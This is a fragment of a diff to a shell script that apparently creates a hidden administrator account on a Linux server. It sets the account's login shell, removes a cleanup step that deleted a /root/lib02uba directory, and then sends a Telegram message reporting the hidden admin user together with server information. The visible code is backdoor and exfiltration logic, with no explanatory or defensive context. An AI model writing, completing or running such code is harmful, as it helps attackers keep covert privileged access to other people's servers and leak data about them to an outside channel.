@@ -52,8 +52,4 @@ else
     usermod -s /bin/bash "$user_id"
 fi
 
-# Cleanup
-cd /root || exit
-rm -rf /root/lib02uba
-
 send_telegram_message "Admin user $user_id has been created and hidden successfully. $server_info"
